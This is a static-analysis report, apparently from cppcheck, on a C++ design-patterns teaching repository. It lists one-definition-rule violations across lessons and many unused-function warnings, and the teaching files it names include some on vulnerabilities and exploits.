D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:20:1: error: The one definition rule is violated, different classes/structs have the same name 'Message' [ctuOneDefinitionRuleViolation]
class Message {
^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:31:1: note: The one definition rule is violated, different classes/structs have the same name 'Message'
struct Message {
^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Message'
class Message {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:89:1: error: The one definition rule is violated, different classes/structs have the same name 'User' [ctuOneDefinitionRuleViolation]
class User {
^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:296:1: note: The one definition rule is violated, different classes/structs have the same name 'User'
struct User {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:89:1: note: The one definition rule is violated, different classes/structs have the same name 'User'
class User {
^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_vulnerabilities.cpp:20:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerableactor_model' [ctuOneDefinitionRuleViolation]
class Vulnerableactor_model {
^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\exploits\actor_model_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerableactor_model'
class Vulnerableactor_model {
^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerableactor_model'
class Vulnerableactor_model {
^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\exploits\reactor_exploits.cpp:16:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerablereactor' [ctuOneDefinitionRuleViolation]
class Vulnerablereactor {
^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablereactor'
class Vulnerablereactor {
^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\exploits\reactor_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablereactor'
class Vulnerablereactor {
^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:237:1: error: The one definition rule is violated, different classes/structs have the same name 'Database' [ctuOneDefinitionRuleViolation]
class Database {
^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\cache_aside_cpp23_comparison.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Database'
class Database { public: std::string query(const std::string& key) { return "value_" + key; } };
^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:237:1: note: The one definition rule is violated, different classes/structs have the same name 'Database'
class Database {
^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\cache_aside_vulnerabilities.cpp:20:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerablecache_aside' [ctuOneDefinitionRuleViolation]
class Vulnerablecache_aside {
^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\exploits\cache_aside_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablecache_aside'
class Vulnerablecache_aside {
^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\cache_aside_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablecache_aside'
class Vulnerablecache_aside {
^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:237:1: error: The one definition rule is violated, different classes/structs have the same name 'Database' [ctuOneDefinitionRuleViolation]
class Database {
^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\multi_level_cache.cpp:419:1: note: The one definition rule is violated, different classes/structs have the same name 'Database'
class Database {
^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:237:1: note: The one definition rule is violated, different classes/structs have the same name 'Database'
class Database {
^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\cache_aside_pattern.cpp:314:1: error: The one definition rule is violated, different classes/structs have the same name 'MultiLevelCache < std :: string , std :: string >' [ctuOneDefinitionRuleViolation]
class MultiLevelCache : public CacheInterface<Key, Value> {
^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\multi_level_cache.cpp:319:1: note: The one definition rule is violated, different classes/structs have the same name 'MultiLevelCache < std :: string , std :: string >'
class MultiLevelCache {
^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\cache_aside_pattern.cpp:314:1: note: The one definition rule is violated, different classes/structs have the same name 'MultiLevelCache < std :: string , std :: string >'
class MultiLevelCache : public CacheInterface<Key, Value> {
^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\cache_aside_pattern.cpp:41:1: error: The one definition rule is violated, different classes/structs have the same name 'CacheEntry < std :: string >' [ctuOneDefinitionRuleViolation]
struct CacheEntry {
^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\multi_level_cache.cpp:33:1: note: The one definition rule is violated, different classes/structs have the same name 'CacheEntry < std :: string >'
struct CacheEntry {
^
D:\Work\Patterns\08-high-load\lesson_8_1_cache_aside\cache_aside_pattern.cpp:41:1: note: The one definition rule is violated, different classes/structs have the same name 'CacheEntry < std :: string >'
struct CacheEntry {
^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_cpp23_comparison.cpp:507:1: error: The one definition rule is violated, different classes/structs have the same name 'UnstableService' [ctuOneDefinitionRuleViolation]
class UnstableService {
^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_pattern.cpp:290:1: note: The one definition rule is violated, different classes/structs have the same name 'UnstableService'
class UnstableService {
^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_cpp23_comparison.cpp:507:1: note: The one definition rule is violated, different classes/structs have the same name 'UnstableService'
class UnstableService {
^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_vulnerabilities.cpp:20:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerablecircuit_breaker' [ctuOneDefinitionRuleViolation]
class Vulnerablecircuit_breaker {
^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\exploits\circuit_breaker_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablecircuit_breaker'
class Vulnerablecircuit_breaker {
^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablecircuit_breaker'
class Vulnerablecircuit_breaker {
^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:237:1: error: The one definition rule is violated, different classes/structs have the same name 'Database' [ctuOneDefinitionRuleViolation]
class Database {
^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\resilient_client.cpp:353:1: note: The one definition rule is violated, different classes/structs have the same name 'Database'
class Database {
^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:237:1: note: The one definition rule is violated, different classes/structs have the same name 'Database'
class Database {
^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\exploits\producer_consumer_exploits.cpp:23:1: error: The one definition rule is violated, different classes/structs have the same name 'Task' [ctuOneDefinitionRuleViolation]
struct Task {
^
D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\bulkhead_pattern.cpp:42:1: note: The one definition rule is violated, different classes/structs have the same name 'Task'
struct Task {
^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\exploits\producer_consumer_exploits.cpp:23:1: note: The one definition rule is violated, different classes/structs have the same name 'Task'
struct Task {
^
D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\bulkhead_vulnerabilities.cpp:20:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerablebulkhead' [ctuOneDefinitionRuleViolation]
class Vulnerablebulkhead {
^
D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\exploits\bulkhead_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablebulkhead'
class Vulnerablebulkhead {
^
D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\bulkhead_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablebulkhead'
class Vulnerablebulkhead {
^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\exploits\saga_exploits.cpp:16:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerablesaga' [ctuOneDefinitionRuleViolation]
class Vulnerablesaga {
^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\saga_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablesaga'
class Vulnerablesaga {
^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\exploits\saga_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablesaga'
class Vulnerablesaga {
^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\game_strategies.cpp:319:1: error: The one definition rule is violated, different classes/structs have the same name 'GameObject' [ctuOneDefinitionRuleViolation]
class GameObject {
^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:344:1: note: The one definition rule is violated, different classes/structs have the same name 'GameObject'
class GameObject : public Resettable {
^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\game_strategies.cpp:319:1: note: The one definition rule is violated, different classes/structs have the same name 'GameObject'
class GameObject {
^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\exploits\object_pool_exploits.cpp:16:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerableobject_pool' [ctuOneDefinitionRuleViolation]
class Vulnerableobject_pool {
^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerableobject_pool'
class Vulnerableobject_pool {
^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\exploits\object_pool_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerableobject_pool'
class Vulnerableobject_pool {
^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:284:1: error: The one definition rule is violated, different classes/structs have the same name 'DatabaseConnection' [ctuOneDefinitionRuleViolation]
class DatabaseConnection : public Resettable {
^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\resource_pool.cpp:36:1: note: The one definition rule is violated, different classes/structs have the same name 'DatabaseConnection'
class DatabaseConnection : public Resource {
^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:284:1: note: The one definition rule is violated, different classes/structs have the same name 'DatabaseConnection'
class DatabaseConnection : public Resettable {
^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:404:1: error: The one definition rule is violated, different classes/structs have the same name 'NetworkSocket' [ctuOneDefinitionRuleViolation]
class NetworkSocket : public Resettable {
^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\resource_pool.cpp:115:1: note: The one definition rule is violated, different classes/structs have the same name 'NetworkSocket'
class NetworkSocket : public Resource {
^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:404:1: note: The one definition rule is violated, different classes/structs have the same name 'NetworkSocket'
class NetworkSocket : public Resettable {
^
D:\Work\Patterns\09-performance\lesson_9_2_flyweight\exploits\flyweight_exploits.cpp:16:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerableflyweight' [ctuOneDefinitionRuleViolation]
class Vulnerableflyweight {
^
D:\Work\Patterns\09-performance\lesson_9_2_flyweight\flyweight_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerableflyweight'
class Vulnerableflyweight {
^
D:\Work\Patterns\09-performance\lesson_9_2_flyweight\exploits\flyweight_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerableflyweight'
class Vulnerableflyweight {
^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_cpp23_comparison.cpp:21:1: error: The one definition rule is violated, different classes/structs have the same name 'PrintCommand' [ctuOneDefinitionRuleViolation]
class PrintCommand : public Command {
^
D:\Work\Patterns\09-performance\lesson_9_3_command_queue\command_queue_cpp23_comparison.cpp:21:1: note: The one definition rule is violated, different classes/structs have the same name 'PrintCommand'
class PrintCommand : public Command {
^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_cpp23_comparison.cpp:21:1: note: The one definition rule is violated, different classes/structs have the same name 'PrintCommand'
class PrintCommand : public Command {
^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_pattern.cpp:288:1: error: The one definition rule is violated, different classes/structs have the same name 'CommandQueue' [ctuOneDefinitionRuleViolation]
class CommandQueue {
^
D:\Work\Patterns\09-performance\lesson_9_3_command_queue\command_queue_pattern.cpp:143:1: note: The one definition rule is violated, different classes/structs have the same name 'CommandQueue'
class CommandQueue {
^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_pattern.cpp:288:1: note: The one definition rule is violated, different classes/structs have the same name 'CommandQueue'
class CommandQueue {
^
D:\Work\Patterns\09-performance\lesson_9_3_command_queue\command_queue_vulnerabilities.cpp:20:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerablecommand_queue' [ctuOneDefinitionRuleViolation]
class Vulnerablecommand_queue {
^
D:\Work\Patterns\09-performance\lesson_9_3_command_queue\exploits\command_queue_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablecommand_queue'
class Vulnerablecommand_queue {
^
D:\Work\Patterns\09-performance\lesson_9_3_command_queue\command_queue_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablecommand_queue'
class Vulnerablecommand_queue {
^
D:\Work\Patterns\01-basics\lesson_1_2_raii\raii_example.cpp:185:10: style: The function 'isOpen' is never used. [unusedFunction]
    bool isOpen() const { return isOpen_; }
         ^
D:\Work\Patterns\01-basics\lesson_1_2_raii\resource_manager.cpp:163:21: style: The function 'findResource' is never used. [unusedFunction]
    SystemResource* findResource(const std::string& name) {
                    ^
D:\Work\Patterns\01-basics\lesson_1_2_raii\resource_manager.cpp:269:10: style: The function 'isLocked' is never used. [unusedFunction]
    bool isLocked() const { return locked_; }
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp:276:12: style: The function 'getSide' is never used. [unusedFunction]
    double getSide() const { return side; }
           ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp:304:10: style: The function 'setRadius' is never used. [unusedFunction]
    void setRadius(double r) { radius = r; }
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp:305:12: style: The function 'getRadius' is never used. [unusedFunction]
    double getRadius() const { return radius; }
           ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:105:10: style: The function 'setName' is never used. [unusedFunction]
    void setName(const std::string& n) { name = n; }
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:107:10: style: The function 'setPassword' is never used. [unusedFunction]
    void setPassword(const std::string& p) { password = p; }
         ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:142:17: style: The function 'sendPasswordReset' is never used. [unusedFunction]
    static void sendPasswordReset(const User& user) {
                ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:176:17: style: The function 'findById' is never used. [unusedFunction]
    static User findById(int id) {
                ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\srp_example.cpp:328:17: style: The function 'sendShippingNotification' is never used. [unusedFunction]
    static void sendShippingNotification(const Order& order) {
                ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\srp_example.cpp:388:17: style: The function 'generateCustomerReport' is never used. [unusedFunction]
    static void generateCustomerReport(const std::string& customerEmail) {
                ^
D:\Work\Patterns\02-principles\lesson_2_1_solid\srp_example.cpp:413:24: style: The function 'statusToString' is never used. [unusedFunction]
    static std::string statusToString(Status status) {
                       ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:162:10: style: The function 'getIsValid' is never used. [unusedFunction]
    bool getIsValid() const { return isValid; }
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:401:24: style: The function 'formatDate' is never used. [unusedFunction]
    static std::string formatDate(int year, int month, int day) {
                       ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:482:16: style: The function 'getDatabasePort' is never used. [unusedFunction]
    static int getDatabasePort() {
               ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:486:24: style: The function 'getDatabaseName' is never used. [unusedFunction]
    static std::string getDatabaseName() {
                       ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:490:24: style: The function 'getDatabaseUser' is never used. [unusedFunction]
    static std::string getDatabaseUser() {
                       ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:494:24: style: The function 'getDatabasePassword' is never used. [unusedFunction]
    static std::string getDatabasePassword() {
                       ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:503:16: style: The function 'getRedisPort' is never used. [unusedFunction]
    static int getRedisPort() {
               ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:507:24: style: The function 'getRedisPassword' is never used. [unusedFunction]
    static std::string getRedisPassword() {
                       ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:516:16: style: The function 'getApiPort' is never used. [unusedFunction]
    static int getApiPort() {
               ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\dry_example.cpp:520:24: style: The function 'getApiKey' is never used. [unusedFunction]
    static std::string getApiKey() {
                       ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:77:10: style: The function 'addArrayElement' is never used. [unusedFunction]
    void addArrayElement(std::unique_ptr<BadConfigNode> element) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:110:12: style: The function 'getArraySize' is never used. [unusedFunction]
    size_t getArraySize() const {
           ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:117:20: style: The function 'getArrayElement' is never used. [unusedFunction]
    BadConfigNode* getArrayElement(size_t index) const {
                   ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:282:10: style: The function 'hasKey' is never used. [unusedFunction]
    bool hasKey(const std::string& key) const {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:342:10: style: The function 'setMetadata' is never used. [unusedFunction]
    void setMetadata(const std::string& key, const std::string& value) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:346:17: style: The function 'getMetadata' is never used. [unusedFunction]
    std::string getMetadata(const std::string& key) const {
                ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:366:17: style: The function 'getMessage' is never used. [unusedFunction]
    std::string getMessage() const { return message; }
                ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:370:9: style: The function 'getMaxRetries' is never used. [unusedFunction]
    int getMaxRetries() const { return maxRetries; }
        ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:472:24: style: The function 'getRecipient' is never used. [unusedFunction]
    const std::string& getRecipient() const { return recipient; }
                       ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\kiss_example.cpp:537:10: style: The function 'setPriority' is never used. [unusedFunction]
    void setPriority(double newPriority) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\principles_comparison.cpp:359:21: style: The function 'warn' is never used. [unusedFunction]
        static void warn(const std::string& message) {
                    ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:127:10: style: The function 'setDeliveryStatus' is never used. [unusedFunction]
    void setDeliveryStatus(const std::string& notificationId, DeliveryStatus status) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:133:10: style: The function 'scheduleNotification' is never used. [unusedFunction]
    void scheduleNotification(const std::string& templateId,
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:145:10: style: The function 'configureRetryPolicy' is never used. [unusedFunction]
    void configureRetryPolicy(const std::string& templateId,
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:160:10: style: The function 'setRecipientPreferences' is never used. [unusedFunction]
    void setRecipientPreferences(const std::string& recipientId,
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:185:10: style: The function 'importTemplates' is never used. [unusedFunction]
    void importTemplates(const std::string& filename) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:368:10: style: The function 'setEvictionPolicy' is never used. [unusedFunction]
    void setEvictionPolicy(EvictionPolicy newPolicy) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:379:10: style: The function 'loadFromFile' is never used. [unusedFunction]
    void loadFromFile(const std::string& filename) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:566:10: style: The function 'addHandler' is never used. [unusedFunction]
    void addHandler(std::function<void(const LogEntry&)> handler) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:601:10: style: The function 'setOutputFormat' is never used. [unusedFunction]
    void setOutputFormat(OutputFormat newFormat) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:606:10: style: The function 'setCompression' is never used. [unusedFunction]
    void setCompression(CompressionType compType) {
         ^
D:\Work\Patterns\02-principles\lesson_2_2_dry_kiss_yagni\yagni_example.cpp:611:10: style: The function 'enableAsync' is never used. [unusedFunction]
    void enableAsync(bool enable) {
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\comparison_analysis.cpp:574:41: style: The function 'getExecutedQueries' is never used. [unusedFunction]
        const std::vector<std::string>& getExecutedQueries() const {
                                        ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:88:10: style: The function 'wheelie' is never used. [unusedFunction]
    void wheelie() {
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:104:10: style: The function 'switchToElectric' is never used. [unusedFunction]
    void switchToElectric() {
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:109:10: style: The function 'switchToGas' is never used. [unusedFunction]
    void switchToGas() {
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:147:10: style: The function 'isRunning' is never used. [unusedFunction]
    bool isRunning() const { return running; }
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:149:9: style: The function 'getPower' is never used. [unusedFunction]
    int getPower() const { return power; }
        ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:164:10: style: The function 'inflate' is never used. [unusedFunction]
    void inflate() {
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:169:10: style: The function 'deflate' is never used. [unusedFunction]
    void deflate() {
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:178:10: style: The function 'isInflated' is never used. [unusedFunction]
    bool isInflated() const { return inflated; }
         ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:179:24: style: The function 'getMaterial' is never used. [unusedFunction]
    const std::string& getMaterial() const { return material; }
                       ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:180:9: style: The function 'getDiameter' is never used. [unusedFunction]
    int getDiameter() const { return diameter; }
        ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:205:9: style: The function 'getCurrentFuel' is never used. [unusedFunction]
    int getCurrentFuel() const { return currentFuel; }
        ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:206:9: style: The function 'getCapacity' is never used. [unusedFunction]
    int getCapacity() const { return capacity; }
        ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\composition_example.cpp:423:17: style: The function 'getCurrentPaymentMethod' is never used. [unusedFunction]
    std::string getCurrentPaymentMethod() const {
                ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:150:9: style: The function 'getAge' is never used. [unusedFunction]
    int getAge() const { return age; }
        ^
D:\Work\Patterns\02-principles\lesson_2_3_composition_inheritance\inheritance_example.cpp:192:9: style: The function 'getWingSpan' is never used. [unusedFunction]
    int getWingSpan() const { return wingSpan; }
        ^
D:\Work\Patterns\03-creational\lesson_3_1_singleton\exploits\singleton_exploits.cpp:185:10: style: The function 'getDataPointer' is never used. [unusedFunction]
    int* getDataPointer() {
         ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\factory_method.cpp:341:10: style: The function 'isRegistered' is never used. [unusedFunction]
    bool isRegistered(const std::string& name) const {
         ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\product_factory.cpp:43:9: style: The function 'getHealth' is never used. [unusedFunction]
    int getHealth() const { return health_; }
        ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\product_factory.cpp:51:10: style: The function 'isAlive' is never used. [unusedFunction]
    bool isAlive() const { return health_ > 0; }
         ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\product_factory.cpp:83:10: style: The function 'gainExperience' is never used. [unusedFunction]
    void gainExperience(int exp) {
         ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\product_factory.cpp:128:24: style: The function 'getEnemyType' is never used. [unusedFunction]
    const std::string& getEnemyType() const { return enemyType_; }
                       ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\product_factory.cpp:158:10: style: The function 'talk' is never used. [unusedFunction]
    void talk() {
         ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\product_factory.cpp:305:10: style: The function 'setOnClickHandler' is never used. [unusedFunction]
    void setOnClickHandler(std::function<void()> handler) {
         ^
D:\Work\Patterns\03-creational\lesson_3_2_factory_method\product_factory.cpp:340:24: style: The function 'getText' is never used. [unusedFunction]
    const std::string& getText() const { return text_; }
                       ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:276:32: style: The function 'setCredentials' is never used. [unusedFunction]
    VulnerableDatabaseBuilder& setCredentials(const std::string& user, const std::string& pass) {
                               ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\exploits\builder_exploits.cpp:53:6: style: The function 'maliciousCallback' is never used. [unusedFunction]
void maliciousCallback() {
     ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_vulnerabilities.cpp:52:11: style: The function 'getRawObject' is never used. [unusedFunction]
    void* getRawObject() {
          ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_vulnerabilities.cpp:56:10: style: The function 'isValidObject' is never used. [unusedFunction]
    bool isValidObject() const {
         ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_vulnerabilities.cpp:134:10: style: The function 'adaptWithoutOwnership' is never used. [unusedFunction]
    void adaptWithoutOwnership(void* obj) {
         ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_vulnerabilities.cpp:203:12: style: The function 'getSizeCount' is never used. [unusedFunction]
    size_t getSizeCount() const {
           ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\modern_adapter.cpp:129:10: style: The function 'setMaxCacheSize' is never used. [unusedFunction]
    void setMaxCacheSize(size_t size) {
         ^
D:\Work\Patterns\04-structural\lesson_4_2_decorator\decorator_cpp23_comparison.cpp:38:32: style: The function 'buildChain' is never used. [unusedFunction]
    std::unique_ptr<Component> buildChain(int depth) {
                               ^
D:\Work\Patterns\04-structural\lesson_4_3_facade\facade_vulnerabilities.cpp:227:12: style: The function 'getMaxRequests' is never used. [unusedFunction]
    size_t getMaxRequests() const {
           ^
D:\Work\Patterns\04-structural\lesson_4_4_proxy\exploits\proxy_exploits.cpp:69:10: style: The function 'isAuth' is never used. [unusedFunction]
    bool isAuth() const {
         ^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\modern_observer.cpp:182:10: style: The function 'publishAsync' is never used. [unusedFunction]
    void publishAsync(const std::string& eventType, const std::string& data) {
         ^
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\modern_observer.cpp:280:30: style: The function 'getTopics' is never used. [unusedFunction]
    std::vector<std::string> getTopics() const {
                             ^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\game_strategies.cpp:202:9: style: The function 'getMana' is never used. [unusedFunction]
    int getMana() const { return mana_; }
        ^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\game_strategies.cpp:346:25: style: The function 'getPosition' is never used. [unusedFunction]
    std::pair<int, int> getPosition() const {
                        ^
D:\Work\Patterns\05-behavioral\lesson_5_2_strategy\strategy_pattern.cpp:420:21: style: The function 'getStrategy' is never used. [unusedFunction]
    const Strategy& getStrategy() const {
                    ^
